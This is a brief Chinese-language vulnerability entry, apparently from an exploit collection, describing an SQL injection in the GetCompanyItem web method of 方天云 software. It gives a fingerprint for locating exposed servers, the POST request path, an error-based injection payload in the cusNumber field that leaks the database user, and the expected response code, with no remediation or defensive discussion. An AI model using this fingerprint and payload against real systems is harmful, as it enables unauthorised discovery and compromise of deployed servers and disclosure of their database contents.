# 方天云-GetCompanyItem-sql注入漏洞

方天云-GetCompanyItem ｜ SQL注入 ｜ —
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1`

**Payload**
```
{cusNumber:"1' and 1=user--+"}
```
- **响应特征**：200